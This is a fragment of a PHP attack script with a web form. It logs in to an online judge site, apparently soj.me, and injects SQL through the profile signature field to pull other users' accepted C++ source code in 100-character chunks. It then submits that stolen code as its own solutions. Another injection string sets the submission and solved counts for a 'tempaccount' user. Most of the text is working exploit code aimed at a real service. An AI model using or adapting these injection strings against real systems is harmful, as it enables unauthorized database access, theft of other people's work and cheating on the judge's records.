...
<form name="getPid"  method="get" >
	<label>minpid:<input name="minpid" type="input" id="minpid"></label>
	<label>maxpid:<input name="maxpid" type="input" id="maxpid"></label>
	<label>other:<input name="ch" type="input" id="ch" value="0"></label>
	<input type="submit" value="Get" />   
</form>
<?php

if(isset($_GET[maxpid]) and $_GET[maxpid]!="" and isset($_GET[minpid]) and $_GET[minpid]!="" and isset($_GET[ch]) and $_GET[ch]!=""){
	$minpid=$_GET[minpid];
	$maxpid=$_GET[maxpid];
	$ch=$_GET[ch];
	$pid=(int)$minpid;
	...
	if($client->post('/action.php?act=Login',array(
		...
		$uid=$cooies['uid'];
		$mysign=" /*By Eric! Email:nameljh@sina.com */ ";
		
		for($pid=$minpid;$pid<=$maxpid;$pid++){
			echo "<p>start dealing with pid=".$pid."...<br>";
			$answer="//pid=".$pid."\n".$mysign."\n";
			
			$index=1;
			while(1){
				$str1="',signature=(select substr(sourcecode,".$index.",100) from status where pid=".$pid." and status='Accepted' and language='C++' and length(sourcecode)>30 order by length(sourcecode) limit ".$ch.",1) where username='".$username."'#";
			...
			$answer=str_replace("\n",$mysign."\n",$answer);
			if($client->post('http://soj.me/action.php?act=Submit',array(
				'pid'=>$pid,
				'cid'=>'0',
				'language'=>'2',
				'source'=>$answer))){
			...
			if($pid%5==0){
					$str1="',submissions=10,solved=5 where username='tempaccount';#";
				if($client->post('/profile_edit.php',array(
					'uid'=>$uid,
					'nickname'=>'',
					'signature'=>$str1,
